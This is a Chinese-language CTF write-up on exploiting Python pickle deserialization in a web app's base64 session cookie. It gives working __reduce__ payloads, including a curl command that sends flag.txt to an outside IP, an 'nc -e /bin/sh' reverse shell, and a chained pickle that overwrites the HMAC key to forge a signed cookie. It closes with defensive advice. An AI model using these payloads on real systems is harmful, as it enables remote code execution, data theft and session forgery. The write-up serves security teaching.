gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu
```
可以想到是pickle序列化后又进行了base64编码
对他反向操作
```python
import pickle  
from base64 import *  
  
a = 'gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu'  
print(pickle.loads(b64decode(a)))  
# {'money': 500, 'history': [], 'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'}
```
说明确实存在pickle反序列化漏洞。
并且没有什么过滤
```python
import pickle  
import base64  
  
class test(object):  
    def __reduce__(self):  
        return (eval,("__import__('os').popen('env').read()",))  
a = test()  
print(base64.b64encode(pickle.dumps(a)))
```
但是发送却报错500，那就反弹shell吧。
```python
import pickle
import base64
class A(object):
    def __reduce__(self):
        return (eval,("__import__('os').system('curl -d @flag.txt 174.0.157.204:2333')",))
a = A()
print(base64.b64encode(pickle.dumps(a)))
```
也可以
```python
import pickle
import base64
import os
class A(object):
    def __reduce__(self):
           return (os.system,('nc IP PORT  -e /bin/sh',))
a = A()
print(base64.b64encode(pickle.dumps(a)))
```
伪造session后刷新就可以在vps得到结果了。
还有一种方法就是覆盖key并伪造cookie
如果key知道就可以随意伪造session了
```python
import pickle  
  
key = b'11111111111111111111111111111111'  
  
  
class A(object):  
    def __reduce__(self):  
        return (exec, ("global key;key=b'66666666666666666666666666666666'",))  
  
  
a = A()  
pickle_a = pickle.dumps(a)  
print(pickle_a)  
pickle.loads(pickle_a)  
print(key)  
#b"\x80\x04\x95N\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04exec\x94\x93\x94\x8c2global key;key=b'66666666666666666666666666666666'\x94\x85\x94R\x94."  
#b'66666666666666666666666666666666'
```

```python
import pickle  
import hmac  
import hashlib  
  
key = b'66666666666666666666666666666666'  
cookies = {"money": 10000, "history": []}  
h = hmac.new(key,digestmod=hashlib.sha256)  
h.update(str(cookies).encode())  
cookies["anti_tamper_hmac"] = h.digest().hex()  
result2 = pickle.dumps(cookies)  
print(result2)
#b"\x80\x04\x95r\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x05money\x94M\x10'\x8c\x07history\x94]\x94\x8c\x10anti_tamper_hmac\x94\x8c@2bea58b4cc5fcd8d40c0ba7c82618622526ae6f0299ae1dc9048d5ebb04ed145\x94u."
```
这里把余额设置为10000，并用我们自己的key来给cookie做签名，得到的pickle流：

然后问题就来了，由于我们覆盖的key只能在本次请求中生效，所以我们伪造的cookie也必须在覆盖key的请求中一起发送过去，覆盖key的payload我们是使用`__reduce__`方式生成的，而伪造cookie的操作我们是直接序列化cookie生成的，怎么把这两个操作合并起来呢，这个payload应该怎么写呢，其实很简单，依据上面对pickle流的介绍：最终留在栈顶的值将被作为反序列化对象返回。所以我们只需要把第一个pickle流结尾表示结束的.去掉，把第二个pickle开头的版本声明去掉，两者拼接起来即可：  
第一个pickle流：  
`b"\x80\x03cbuiltins\nexec\nq\x00X4\x00\x00\x00global key;key = b'66666666666666666666666666666666'q\x01\x85q\x02Rq\x03}."`  
第二个pickle流：  
`b"\x80\x03}q\x00(X\x05\x00\x00\x00moneyq\x01M\x10'X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u."`  
按所说方法拼接：  
`b"\x80\x03cbuiltins\nexec\nq\x00X4\x00\x00\x00global key;key = b'66666666666666666666666666666666'q\x01\x85q\x02Rq\x03}q\x00(X\x05\x00\x00\x00moneyq\x01M\x10'X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u."`

base64编码后，抓下购买flag的包，修改其中的cookie发送：
```python
import pickle  
import base64  
  
b = b"\x80\x03cbuiltins\nexec\nq\x00X4\x00\x00\x00global key;key = b'66666666666666666666666666666666'q\x01\x85q\x02Rq\x03}q\x00(X\x05\x00\x00\x00moneyq\x01M\x10'X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u."  
print(base64.b64encode(b))
```
发送的响应包里会得到一段session，把他解码再反序列化
```python
import pickle  
import base64  
  
b = b'gAN9cQAoWAUAAABtb25leXEBTSgjWAcAAABoaXN0b3J5cQJdcQNYKwAAAGZsYWd7YTc5Mjg2OTgtMzJhNS00Y2U0LTg4YjgtNWI1YjAyNzBiMzBifQpxBGFYEAAAAGFudGlfdGFtcGVyX2htYWNxBVggAAAAYzc0Mjk3MzgwNWI0Y2QzMjRiMmI3MDA1ODRjYzRmNWJxBnUu'  
print(pickle.loads(base64.b64decode(b)))
```
得到
```
{'money': 9000, 'history': ['flag{a7928698-32a5-4ce4-88b8-5b5b0270b30b}\n'], 'anti_tamper_hmac': 'c742973805b4cd324b2b700584cc4f5b'}
```
## 防御

对于pickle反序列化漏洞，官方的第一个建议就是永远不要unpickle来自于不受信任的或者未经验证的来源的数据。第二个就是通过重写`Unpickler.find_class()`来限制全局变量
最好使用白名单，这样不容易被绕过。
## 参考文章
https://goodapple.top/archives/1069
https://blog.csdn.net/Elite__zhb/article/details/132943998
https://tttang.com/archive/1782/
https://forum.butian.net/share/1929
https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html


